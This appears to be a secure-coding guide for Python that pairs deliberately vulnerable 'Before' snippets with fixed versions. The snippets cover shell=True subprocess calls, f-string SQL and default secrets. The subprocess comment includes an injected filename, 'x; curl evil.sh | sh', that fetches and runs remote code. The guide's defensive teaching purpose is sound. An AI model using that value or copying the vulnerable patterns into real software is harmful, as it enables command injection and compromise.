# Boundaries: input, processes, files and the network

Read this when Python code handles untrusted input or talks to the outside world: HTTP clients, subprocess, SQL, file paths, archives, uploads, deserialization, settings and logging. Authorization design and SSRF live in the security-engineering skill.

## HTTP clients

One client per process, explicit timeouts from config, retries only where repeating is safe.

```python
# Before: new pool and TLS handshake per call, no timeout, POST retried blindly
def charge(order):
    for _ in range(3):
        try:
            return requests.post(f"{PROVIDER_URL}/charges", json=order.payload()).json()
        except Exception:
            continue

# After
def build_session(cfg: ProviderConfig) -> requests.Session:
    session = requests.Session()
    retry = Retry(
        total=cfg.max_retries,
        backoff_factor=cfg.backoff_factor,
        status_forcelist=(502, 503, 504),
        allowed_methods=frozenset({"GET", "HEAD"}),
    )
    session.mount("https://", HTTPAdapter(max_retries=retry))
    return session


def charge(session: requests.Session, cfg: ProviderConfig, order: Order) -> ChargeResult:
    resp = session.post(
        f"{cfg.base_url}/charges",
        json=order.payload(),
        headers={"Idempotency-Key": order.charge_key},
        timeout=(cfg.connect_timeout_s, cfg.read_timeout_s),
    )
    resp.raise_for_status()
    return ChargeResult.model_validate(resp.json())
```

The POST is not in `allowed_methods`; retrying it is a separate decision made by code that knows the idempotency key and treats a timeout as "unknown, reconcile". Validate the response body like any other untrusted input; a provider returning HTML during an outage or a changed field name should fail loudly at the parse, not three calls later.

Other traps:

- `requests` read timeout is per gap between bytes. A server trickling one byte every few seconds never trips it. For a total deadline, run the call under a watchdog (async: `asyncio.timeout`) or stream with your own clock.
- `stream=True` responses return their connection to the pool only when fully read or closed. Use `with session.get(url, stream=True, timeout=...) as resp:`.
- `resp.json()` or `resp.content` on a user-supplied URL reads an unbounded body into memory. Stream with `iter_content` and stop at a byte limit from config.
- The same session shared across threads also shares its cookie jar and default headers; do not set per-user auth on a shared session.

## Subprocess

```python
# Before: filename "x; curl evil.sh | sh" runs a second command; a hang blocks forever
subprocess.run(f"ffmpeg -i {upload_path} -vf scale={width}:-1 {out_path}", shell=True)

# After
subprocess.run(
    [cfg.ffmpeg_bin, "-nostdin", "-i", str(upload_path), "-vf", f"scale={width}:-1", str(out_path)],
    check=True,
    timeout=cfg.transcode_timeout_s,
    capture_output=True,
)
```

`width` must already be a validated `int`. An argument list stops shell injection but not option injection: a user value beginning with `-` is read as a flag by most tools, so validate it or place it after `--` where the tool supports that. On timeout, `run` kills the child and raises `TimeoutExpired`; grandchildren started by the child are not killed. Log `stderr` on failure, but trimmed, since tools echo their arguments.

On Windows, the OS may launch `.bat` and `.cmd` files through the shell regardless of `shell=False`, so arguments to them can be shell-parsed with no escaping.

## SQL

```python
# Before
cur.execute(f"SELECT * FROM products WHERE category = '{category}' ORDER BY {sort}")

# After: values bound, identifier chosen from a fixed map
PRODUCT_ORDER = {"name": "name ASC, id ASC", "price": "price_minor ASC, id ASC"}

cur.execute(
    f"SELECT id, name, price_minor FROM products WHERE category = %s ORDER BY {PRODUCT_ORDER[sort]}",
    (category,),
)
```

The f-string in the second version is safe because `PRODUCT_ORDER[sort]` can only produce one of two constants, and an unknown `sort` raises `KeyError` (map it to a 400 at the boundary). When reviewing, trace where each interpolated piece comes from before reporting injection.

Placeholder style depends on the driver: psycopg uses `%s` (and `%(name)s`), sqlite3 uses `?` or `:name`, SQLAlchemy `text()` uses `:name`. A literal `%` in a psycopg query with parameters must be written `%%`. `LIKE` patterns built from input need `%`, `_` and the escape character escaped in the value, not in the SQL.

SQLAlchemy's `text()`, `literal_column()`, `order_by(text(...))` and `.where(text(...))` take raw SQL; the ORM does not protect what is inside them.

## Paths, uploads and archives

Client-supplied names should not become paths. Store uploads under a generated id, keep the original name only as metadata, and serve downloads by id after an ownership check. When a name must map to a path:

```python
def safe_child(base: Path, name: str) -> Path:
    root = base.resolve()
    target = (root / name).resolve()
    if not target.is_relative_to(root):
        raise PermissionError(name)
    return target
```

`resolve()` follows symlinks, so a symlink inside `root` pointing outside is also rejected. The check does not stop a race where the path is swapped between check and open; if other users can write inside `root`, open with `O_NOFOLLOW` or keep untrusted writers out of served directories. `is_relative_to` is 3.9+; on older versions compare `os.path.commonpath`.

Traversal is only a finding if the name can contain the dangerous characters: framework path segments often cannot contain `/`, while query parameters, form fields, JSON bodies and archive member names can.

Archives:

```python
with tarfile.open(archive_path) as tar:
    members = tar.getmembers()
    if len(members) > cfg.max_archive_members:
        raise ArchiveRejected("too many members")
    if sum(m.size for m in members) > cfg.max_archive_bytes:
        raise ArchiveRejected("too large")
    tar.extractall(dest, filter="data")
```

`filter="data"` (3.12+, backported to some older security releases, default from 3.14) strips leading slashes and refuses members or link targets that land outside `dest`, as well as device files. It does not limit size. `zipfile` strips absolute paths and `..` when extracting, but zip bombs still need the size and count checks, using `ZipInfo.file_size` and stopping when actual bytes written exceed the limit, since headers can lie.

Temporary files: `NamedTemporaryFile`, `mkstemp` (created with mode 0600) or `TemporaryDirectory`, never `mktemp()` or a fixed name. On 3.12+, `NamedTemporaryFile(delete_on_close=False)` lets you close the file, hand the path to a subprocess, and still have it removed when the context exits.

## Deserialization

| Input | Safe | Unsafe |
|---|---|---|
| JSON | `json.loads`, then a Pydantic model | `jsonpickle` |
| YAML | `yaml.safe_load` | `yaml.load(..., Loader=yaml.Loader)` or `UnsafeLoader` |
| Python objects across a trust boundary | JSON plus a schema; `hmac`-signed payload verified before loading | `pickle`, `shelve`, `joblib.load`, `pandas.read_pickle`, `marshal` |
| Expressions | a small parser for the grammar you need | `eval`, `exec` |

PyYAML 6 made the `Loader` argument mandatory, so unsafe loading is always explicit in the call: search for `Loader=` and check which one.

Treat caches and queues as boundaries. A pickled value in Redis is executed by whoever reads it, so write access to the cache becomes code execution in every worker. Use JSON, or sign and verify.

For untrusted XML, check the Expat version your build links (`pyexpat.EXPAT_VERSION`) against the XML security notes in the Python docs, and prefer `defusedxml`, which refuses entity declarations and external references.

## Settings

```python
# Before: missing secret silently becomes a known string; "false" is truthy
JWT_SECRET = os.environ.get("JWT_SECRET", "dev-secret")
VERIFY_TLS = bool(os.getenv("VERIFY_TLS", "1"))

# After: pydantic-settings; startup fails if a required value is missing or malformed
class Settings(BaseSettings):
    model_config = SettingsConfigDict(env_prefix="BILLING_")

    jwt_secret: SecretStr
    database_url: SecretStr
    verify_tls: bool = True
    provider_timeout_s: float = Field(gt=0)
```

Load settings once at startup in the entry point and pass them in, rather than reading `os.environ` throughout the code. Security switches default to the safe value; a secret never has a default.

## Logging without leaking

- Log explicit fields: `log.info("charge created", extra={"order_id": order.id, "amount_minor": amount})`. Do not log whole requests, headers, settings objects or ORM rows.
- `SecretStr` prints as `**********` in reprs and JSON dumps; call `.get_secret_value()` only at the point of use.
- Dataclasses: `api_key: str = field(repr=False)`.
- Exception messages from DB drivers and HTTP libraries can include connection strings or full URLs with query tokens. Log them server-side, return a stable error code to clients.
- Use `%`-style arguments (`log.info("user %s", user_id)`) rather than f-strings: formatting is skipped when the level is disabled, and log aggregation can group by template.
- If credentials reached logs, rotate them; deleting log lines does not undo shipping them to storage and backups.
